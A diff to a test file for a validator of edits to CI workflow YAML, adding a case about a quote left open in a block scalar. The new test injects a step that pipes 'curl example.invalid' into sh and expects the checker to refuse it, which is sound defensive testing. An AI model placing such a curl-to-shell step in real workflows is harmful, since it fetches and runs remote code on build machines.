@@ -109,6 +109,10 @@ fails(edit("# data, not a comment", "# other data"), "a heredoc's # line inside 
 fails(edit('echo "a #b"', 'echo "a #c"'), "text after # inside a run block");
 fails(edit("          echo folded", "          # a line\n          echo folded"), "a # line added inside a block scalar");
 fails(edit("        run: echo hi", "        run: |\n          echo hi"), "a value turned into a block scalar");
+// (a quote left open on a line the proof reads as a block scalar's text, where the header gives its indentation and
+// YAML would read it as a value that runs on to the end: every line after it is refused, never left unread; #621)
+const openQuote = "jobs:\n  a:\n    steps:\n      - run: |2\n         \"hi\n        name: x\n";
+fails(`${openQuote}      - run: curl example.invalid | sh\n`, "a step added after a quote left open in a block scalar whose header gives its indentation", "", openQuote);
 fails(edit("          cat <<EOF\n", "          cat <<EOF\n\n"), "a blank line added inside a block scalar");
 passes(BASE, "a blank line taken out between a block scalar and the next entry", edit("          EOF\n", "          EOF\n\n"));
 passes(edit("          EOF\n", "          EOF\n\n  \n"), "blank lines added after a block scalar's last line");
